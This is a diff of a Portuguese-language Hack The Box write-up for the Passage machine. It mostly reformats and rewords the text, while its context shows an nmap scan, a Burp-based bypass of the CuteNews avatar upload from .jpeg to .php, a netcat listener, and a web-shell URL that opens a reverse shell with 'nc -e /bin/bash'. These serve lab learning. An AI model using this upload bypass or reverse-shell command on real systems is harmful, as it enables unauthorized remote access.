@@ -30,9 +30,11 @@ netcat
 Usaremos o nmap para encontrar portas e serviços rodando na máquina:
 nmap -v -sS -Pn -A 10.10.10.206
 
-_-v: verbose(output mais detalhado).
-_-sS: syn scan.
-_-Pn: já sabemos que o host está ativo então desativamos o descovery.
+_-v: verbose(output mais detalhado)._
+
+_-sS: syn scan._
+
+_-Pn: já sabemos que o host está ativo então desativamos o descovery._
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 PORT   STATE SERVICE VERSION
@@ -112,10 +114,10 @@ Agora vamos tentar fazer o upload.
 Primeiro vamos ligar o BurpSuite(proxy) para interceptar a requisição e edita-la.
 ![Image](https://i.imgur.com/SsZQS3v.png)
 
-No burp podemos ver a extensão que está sendo enviada (.jpeg)
+Ao interceptar a nossa requisição no Burp podemos ver que a extensão que está sendo enviada é a (.jpeg), como pede o campo no site.
 ![Image](https://i.imgur.com/O2QrZkx.png)
 
-Vamos altera-la para .php e encaminhar a requisição
+Vamos altera-la para .php e encaminhar a requisição.
 ![Image](https://i.imgur.com/gO1W4Nl.png)
 
 Podemos perceber que a requisição foi bem sucedida(200)
@@ -143,9 +145,13 @@ Vamos abrir uma porta em nossa máquina.
 ![Image](https://i.imgur.com/55Noqa6.png)
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 nc -vvnlp 1337
+
 _vv: verbose 2
+
 _-n: nodns
+
 _-l: listen
+
 _-p: port
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
@@ -153,6 +159,7 @@ Agora vamos enviar a conexão com o netcat
 ![Image](https://i.imgur.com/IrydT8Z.png)
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 http://passage.htb/CuteNews/uploads/avatar_chu_chu.php?cmd=/bin/nc 10.10.14.238 1337 -e /bin/bash
+
 _-e: exec 'command'
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
